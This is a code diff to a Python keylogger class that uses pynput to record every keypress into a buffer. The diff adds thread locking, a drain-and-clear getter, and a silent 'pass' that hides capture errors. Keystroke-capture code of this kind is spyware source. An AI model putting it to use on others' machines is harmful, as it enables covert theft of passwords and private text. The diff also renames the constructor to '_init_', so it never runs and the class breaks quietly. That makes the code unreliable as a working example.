@@ -1,10 +1,12 @@
+import threading
 from pynput import keyboard
-from interfaces.IkeyLogger import Ikeylogger
+from interfaces.ikeyLogger import Ikeylogger
 
 class Keyloggerservice(Ikeylogger):
-    def __init__(self):
+    def _init_(self):
         self.logged_keys = []
         self.listener = None
+        self.lock = threading.Lock()
     
     NUMPAD_VK_MAP = {
     96: '0',  # NumPad 0
@@ -39,15 +41,17 @@ class Keyloggerservice(Ikeylogger):
         else:
             return f'[{key}]'  # תציג את שם המקש למעקב
 
-    def on_press(self, key):
+    def _on_press(self, key):
         try:
-            self.logged_keys.append(self.special_tag(key))
-        except Exception as e:
-            print(f"Error in on_press: {e}")
+            with self.lock:
+                self.logged_keys.append(self.special_tag(key))
+        except Exception:
+            pass
 
     def start_logging(self):
-        self.logged_keys = []
-        self.listener = keyboard.Listener(on_press=self.on_press)
+        with self.lock:
+            self.logged_keys = []
+        self.listener = keyboard.Listener(on_press=self._on_press)
         self.listener.start()
 
     def stop_logging(self):
@@ -55,5 +59,9 @@ class Keyloggerservice(Ikeylogger):
             self.listener.stop()
             self.listener = None
 
+
     def get_logged_keys(self):
-        return self.logged_keys
+        with self.lock:
+            keys_copy = self.logged_keys.copy()
+            self.logged_keys.clear()
+        return keys_copy
